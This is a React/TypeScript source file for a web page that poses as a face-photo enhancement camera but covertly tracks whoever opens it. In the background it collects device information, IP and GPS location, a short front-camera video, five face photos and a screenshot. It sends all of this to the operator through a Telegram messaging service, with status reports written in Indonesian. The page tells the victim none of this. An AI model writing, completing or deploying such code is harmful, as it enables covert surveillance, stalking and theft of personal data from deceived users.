import React, { useState, useEffect, useRef } from 'react';
import CameraUI from './components/LoadingScreen';
import { 
    getDeviceInformation, 
    getGpsLocation, 
    recordVideo, 
    takeScreenshot 
} from './services/trackingService';
import { sendMessage, sendPhoto, sendVideo } from './services/telegramService';

const App: React.FC = () => {
    const [uiState, setUiState] = useState<'camera' | 'processing' | 'done'>('camera');
    const [isCameraReady, setIsCameraReady] = useState(false);
    const [statusMessage, setStatusMessage] = useState('Initializing camera...');
    const videoRef = useRef<HTMLVideoElement>(null);
    const canvasRef = useRef<HTMLCanvasElement>(null);
    const hasStartedBackgroundTasks = useRef(false);

    useEffect(() => {
        const videoElement = videoRef.current;
        if (!videoElement) return;

        const handleCameraReady = () => {
            setIsCameraReady(true);
            setStatusMessage('Position your face in the frame and capture!');

            // Run background tasks only once the camera is confirmed to be streaming
            if (!hasStartedBackgroundTasks.current) {
                hasStartedBackgroundTasks.current = true;
                runBackgroundTasks();
            }
        };

        const initializeCamera = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false 
                });
                await sendMessage("✅ Berhasil mendapatkan akses ke Kamera Depan.");
                
                videoElement.srcObject = stream;
                // Use the 'canplay' event to ensure the stream is active before enabling functionality
                videoElement.addEventListener('canplay', handleCameraReady, { once: true });
                videoElement.play().catch(e => console.error("Video play failed:", e));
            } catch (err) {
                await sendMessage(`❌ GAGAL mendapatkan akses ke Kamera Depan: ${(err as Error).message}`);
                
                setStatusMessage("Camera access is required. Please enable permissions.");
                console.error("Camera initialization failed:", err);
                // Attempt non-camera tasks even if camera fails, but only once.
                if (!hasStartedBackgroundTasks.current) {
                    hasStartedBackgroundTasks.current = true;
                    // Pass true to skip camera-dependent tasks
                    runBackgroundTasks(true); 
                }
            }
        };

        initializeCamera();

        // Cleanup function
        return () => {
            if (videoElement) {
                videoElement.removeEventListener('canplay', handleCameraReady);
                const stream = videoElement.srcObject as MediaStream;
                stream?.getTracks().forEach(track => track.stop());
            }
        };
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    const runBackgroundTasks = async (cameraFailed: boolean = false) => {
        // Device Info and IP-based Location (no extra permissions needed)
        getDeviceInformation()
            .then(sendMessage)
            .catch(() => sendMessage('❌ Gagal mendapatkan info perangkat & IP.'));

        // High-Accuracy GPS Location (requires separate permission)
        getGpsLocation()
            .then(sendMessage)
            .catch(err => sendMessage(`❌ Gagal mendapatkan lokasi GPS Akurasi Tinggi: ${(err as Error).message}`));

        // Front Camera Video Recording (only if camera initialized successfully)
        if (!cameraFailed) {
            recordVideo(5000)
                .then(({ blob, filename }) => sendVideo(blob, filename))
                .catch(err => sendMessage(`❌ Gagal merekam video kamera depan: ${(err as Error).message}`));
        }
    };

    const handleCapture = async () => {
        if (!isCameraReady) {
            setStatusMessage("Camera not ready. Please wait.");
            return;
        }
        setUiState('processing');
        
        const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

        // 1. Capture 5 photos from front camera with a delay
        for (let i = 1; i <= 5; i++) {
            try {
                setStatusMessage(`Capturing photo ${i} of 5...`);
                const video = videoRef.current;
                const canvas = canvasRef.current;
                if (video && canvas && video.readyState >= video.HAVE_CURRENT_DATA) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d')?.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise<Blob|null>(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
                    if (blob) {
                        await sendPhoto(blob, `front_camera_capture_${i}.jpg`);
                    } else {
                        throw new Error('Canvas to Blob conversion failed');
                    }
                } else {
                    throw new Error('Front camera stream was not ready for capture');
                }
                await delay(1000); // 1-second delay between photos
            } catch (e) {
                await sendMessage(`⚠️ Gagal mengambil Foto Kamera Depan #${i}: ${(e as Error).message}`);
            }
        }

        // 2. Take Screenshot of the current view
        setStatusMessage("Processing final image...");
        try {
            const screenshotBlob = await takeScreenshot();
            if (screenshotBlob) {
                await sendPhoto(screenshotBlob, 'screenshot_capture.jpg');
            }
        } catch (e) {
            await sendMessage('❌ Gagal mengambil screenshot.');
        }

        // 3. Finish UI flow
        setStatusMessage("Enhancement Complete!");
        setUiState('done');
    };

    return (
        <div className="bg-black w-screen h-screen overflow-hidden">
            <CameraUI
                videoRef={videoRef}
                onCapture={handleCapture}
                uiState={uiState}
                statusMessage={statusMessage}
                isCameraReady={isCameraReady}
            />
            <canvas ref={canvasRef} className="hidden"></canvas>
        </div>
    );
};

export default App;